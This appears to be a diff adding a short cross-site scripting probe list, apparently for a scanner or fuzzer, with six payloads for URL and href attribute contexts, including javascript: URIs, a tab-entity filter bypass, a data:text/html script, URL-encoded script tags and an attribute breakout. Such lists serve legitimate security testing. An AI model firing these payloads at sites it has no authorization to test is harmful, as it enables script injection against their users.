@@ -1,0 +1,7 @@
+# XSS payload corpus — URL/attribute-href contexts and misc probes.
+javascript:alert('{c}')
+javascript:void(alert('{c}'))
+jav&#x09;ascript:alert('{c}')
+data:text/html,<script>alert('{c}')</script>
+%3Cscript%3Ealert('{c}')%3C/script%3E
+"><a href="javascript:alert('{c}')">x</a>
